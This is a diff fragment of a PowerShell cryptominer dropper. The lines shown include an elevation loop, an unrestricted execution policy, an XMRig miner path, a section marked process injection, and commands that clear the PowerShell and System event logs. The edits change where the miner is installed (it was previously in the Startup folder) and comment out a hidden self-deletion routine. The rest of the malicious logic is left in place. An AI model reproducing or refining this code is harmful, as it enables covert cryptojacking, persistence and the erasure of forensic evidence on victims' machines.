@@ -13,7 +13,7 @@ while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIde
 
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 
-$minerHome = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xmrig-6.22.2"
+$minerHome = "$confirm\xmrig-6.22.2"
 $minerBinary = "xmrig.exe"
 
 ### === PHASE 5: PROCESS INJECTION ===
@@ -128,7 +128,7 @@ wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
 wevtutil cl "System" 2>$null
 
 # Self-cleanup
-if (-not $PSCommandPath.Contains("xmrig-6.22.2")) {
-    Start-Process powershell "-Command `"Start-Sleep 5; Remove-Item '$PSCommandPath' -Force`"" -WindowStyle Hidden
-}
+# if (-not $PSCommandPath.Contains("xmrig-6.22.2")) {
+#     Start-Process powershell "-Command `"Start-Sleep 5; Remove-Item '$PSCommandPath' -Force`"" -WindowStyle Hidden
+# }
 
